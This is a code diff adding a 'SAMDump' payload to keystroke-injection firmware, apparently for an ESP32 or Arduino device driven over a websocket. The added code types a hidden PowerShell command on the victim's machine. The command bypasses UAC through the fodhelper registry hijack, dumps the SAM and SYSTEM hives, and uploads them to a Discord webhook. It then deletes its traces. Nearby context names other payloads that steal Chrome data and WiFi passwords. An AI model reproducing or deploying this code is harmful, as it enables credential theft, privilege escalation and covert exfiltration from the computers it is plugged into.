@@ -595,6 +595,45 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
         delay(20);
         Keyboard.releaseAll();
         LOG("[WebKB] ChromeExfil launched\n");
+      } else if (combo == "SAMDump") {
+        // Exfiltrate SAM & SYSTEM via UAC Bypass to Discord
+        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press('r');
+        delay(20);
+        Keyboard.releaseAll();
+        delay(800);
+        Keyboard.print("cmd");
+        delay(200);
+        Keyboard.press(KEY_RETURN);
+        delay(20);
+        Keyboard.releaseAll();
+        delay(1000);
+        Keyboard.print(
+            "powershell -w h -nop -ep bypass -c \""
+            "$rcmd='powershell -w h -nop -ep bypass -c \"\"\""
+            "$t=$env:TEMP+''''\\SAM_Backup.zip'''';"
+            "$w=$env:TEMP+''''\\r'''';"
+            "mkdir $w -Force;"
+            "reg save HKLM\\SAM $w''''\\sam'''' /y;"
+            "reg save HKLM\\SYSTEM $w''''\\system'''' /y;"
+            "Compress-Archive -Path $w\\* -DestinationPath $t -Force;"
+            "curl.exe -F (''''file=@''''+$t) "
+            "https://discord.com/api/webhooks/1480962111373840517/"
+            "0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-"
+            "ciyqaBjdfxN4zgmmvD3;"
+            "Remove-Item $w -Recurse -Force;"
+            "Remove-Item $t -Force\"\"\"';"
+            "New-Item 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Force;"
+            "New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name 'DelegateExecute' -Value '' -Force;"
+            "Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(default)' -Value $rcmd -Force;"
+            "Start-Process 'C:\\Windows\\System32\\fodhelper.exe';"
+            "Start-Sleep -s 5;"
+            "Remove-Item 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force\" & exit");
+        delay(300);
+        Keyboard.press(KEY_RETURN);
+        delay(20);
+        Keyboard.releaseAll();
+        LOG("[WebKB] SAMDump launched\n");
       } else if (combo == "WiFiHarvest") {
         // Extract all saved WiFi passwords and send to Discord
         Keyboard.press(KEY_LEFT_GUI);
